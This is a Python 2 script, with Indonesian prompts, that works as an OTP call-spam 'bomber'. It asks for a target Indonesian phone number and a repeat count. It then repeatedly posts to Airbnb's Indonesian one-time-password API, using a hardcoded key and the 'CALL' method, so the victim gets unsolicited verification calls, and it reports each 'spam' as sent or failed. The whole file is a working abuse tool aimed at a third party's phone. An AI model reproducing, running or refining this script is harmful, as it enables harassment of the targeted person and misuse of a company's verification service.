M = '\033[1;31m'
H = '\033[1;32m'
K = '\033[1;33m'
U = '\033[1;34m'
P = '\033[1;35m'
C = '\033[1;36m'
W = '\033[1;37m'
A = '\033[90m'

from requests.exceptions import ConnectionError
from cookielib import LWPCookieJar as Cookie
from time import sleep
import platform, requests, random, sys, os

if platform.system() == 'Linux':
	clear = 'clear'
	
elif platform.system() == 'Windows':
	clear = 'cls'

else:
	pass
	
def tiks(s):
	for x in s + '\n':
		sys.stdout.write(x)
		sys.stdout.flush()
		sleep(random.random() * 0.01)
		
def main():
	
	try:
		print
		pilih = raw_input(W+'Mau Lanjut ( y/n )'+C+' : '+W+'')
		
		if pilih == 'y':
			print
			
			phone = raw_input(W+'NOMOR TARGET ('+H+' Ex :'+C+' 62812xxxx '+W+') : ')
			jumlah = input(''+W+'JUMLAH SPAM'+W+' ('+H+' Ex :'+C+' 3 '+W+') : ')
			
			if jumlah > 5:
				print
				print(W+'Jumlah Melewati Limit'+C+' ^_^')
				sleep(3)
				main()
				
			elif len(phone) < 10:
				print
				print(M+'Nomor Tidak Valid !')
				sys.exit()
			
			elif '62' not in phone[0:2]:
				print
				print(C+'Pakai 62'+W+' !')
				sleep(2.5)
				main()
					
			else:
				pass
			
			print
			for _ in range(int(jumlah)):
				
				sleep(5)
				
				data = {
				'phoneNumber' : phone,
				'workFlow' : 'GLOBAL_SIGNUP_LOGIN',
				'otpMethod' : 'CALL'
				}
				
				Cookies = Cookie('.cookieslog','w')
				Sess = requests.Session()
				Sess.cookies = Cookies
				Sess.headers = {'User-Agent' : 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; 909) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537'}
				
				send = Sess.post('https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=USD&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id', json = data)
			
				if 'error' in send.text:
					print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(phone)+W+' GAGAL'+M+' \xE2\x9C\x96')
				
				else:
					print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(phone)+W+' BERHASIL'+H+' \xE2\x9C\x94')
					Cookies.save()
					
					
		elif pilih == 'n' or pilih == 'N':
			print
			print(W+'Thanks, Jangan Lupa Balik Lagi'+C+' ^_^')
			sys.exit()
			
		else:
			print
			print(W+'Tools Tidak Di Temukan '+C+'^_^')
			sys.exit()
			
	except ConnectionError:
		print
		print(M+' Jaringan Tidak Ada  !')
		sys.exit()
	
	except ValueError:
		print
		print(M+' Yang Anda Masukkan Salah  !')
		sleep(3)
		main()
		
	except NameError:
		print
		print(M+' Masukkan Angka !')
		sleep(3)
		main()
		
if __name__ == '__main__':
		main()
